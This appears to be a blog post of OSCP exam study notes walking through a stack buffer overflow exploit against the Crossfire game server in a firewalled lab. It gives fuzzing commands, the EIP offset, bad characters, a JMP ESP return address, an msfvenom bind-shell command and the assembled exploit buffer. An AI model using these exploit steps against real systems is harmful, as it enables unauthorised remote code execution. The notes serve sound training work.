---
title: "OSCP: Linux Buffer Overflow"
last_modified_at: 2019-11-01T16:20:02-05:00
categories:
  - Cyber Security
tags:
  - OSCP
  - Linux
  - Buffer Overflow
---

# Linux Buffer Overflow (Crossfire)
Download a version of the vulnerable app Crossfire
### Setup safe environment: iptables only allow traffic from loopback interface=targetip
iptables –A, -p, -d, -j # Append, protocol, destination, jump
crossfire listens on port 13327
iptables -A INPUT -p tcp --destination-port 13327 \! -d 127.0.0.1 -j DROP
iptables -A INPUT -p tcp --destination-port 4444 \! -d 127.0.0.1 -j DROP
### 1. Run debugger and crash the app
Get POC code from exploit db
edb --run /usr/games/crossfire/bin/crossfire. In EDBG: Hit RUN twice
crash = “\x41” *4379
buffer = “\x11(setup sound “ + crash + “\x90\x00#”
python fuzz.py
2. Control EIP
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4379
Swap into the crash var: python linux_buffer_overflow.py 
EIP has been overwritten with the hex characters… 46 36 70 46
These are unique 4 bytes in the buffer. Now find where they are in the buffer.
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 4379 -q 46367046
[*] Exact match at offset 4368
Replace “crash = "\x41" * 4368 + "B" * 4 + "C" * 7”: python EIP_BBBB.py


3. Make space for the shellcode  
Check for helpful registers: Follow in dump.
EAX points to buffer start “setup sound “ opstring (len 12). Want to avoid these bytes. 
ESP points to end of buffer “C * 7” (spare bytes). 
Add 12 bytes to EAX to align EAX with the A’s => JMP EAX we skip over “setup sound “
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > add eax,12 	83C00C add eax,byte +0xc
nasm > jmp eax 		FFE0 jmp eax
Add instructions together (JMP EAX + 12 bytes) = \x83\xc0\x0c\xff\xe0 to python. Looks like I didn’t test again here? Just note nasm output and move on?
4. Discover bad characters
All bad chars (except x00) contained in deault named script. Can use this for future.
python bad_chars.py
ID/remove bad chars in buffer. Right-click EAX. Follow in stack & dump. Stack looked better in EDBG. Scroll down dump until end of A’s. Then should see 01, 02, 03… etc until a failure. remove failure from bad_chars.py. Redo until ESP-error-free crash 
Removed: (\x00\x0a\x0d\x20)


5. Redirect execution flow - Find a return address
So, we know we want to reach the buffer pointed to by the ESP register.
EDBG: Plugins: Opcode Seacher: 
Once the application is in a crashed state use dropdown to search for:
ESP -> EIP: 
Choose 1st JMP ESP. Add address to python script at BBBB.
crash = "\x41" * 4368 + "\x97\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0\x90\x90“
EDBG: Add breakpoint at 0x08134597 to execution flow. 
Right-click Go to Address 0x08134597. Double click on it to place breakpoint.
Restart EDBG. Send payload. Should pause at First stage payload.
Next instruction is JMP ESP. F8. We are redirected to ESP 83C00C 
As EAX register aligned by stage one, a JMP EAX takes us to a clean buffer of A’s
6. Make shellcode excluding bad characters
bind or reverse? why?
msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c –b "\x00\x0a\x0d\x20" –e x86/shikata_ga_nai
Resulting shell code is 105 bytes
7. Add shellcode into python script
shellcode = ("\xd9\... \x30")
ret="\x97\x45\x13\x08”
crash=shellcode + "\x41" * (4368 - 105) + ret + "\x83\xC0\x0C\xFF\xE0\x90\x90“
buffer = "\x11(setup sound " + crash + "\x90\x00#“
TURN OFF EDBG FOR EXPLOIT TO WORK: RUN CROSSFIRE: RUN EXPLOIT /usr/games/crossfire/bin/crossfire
python exploit.py
id; whoami
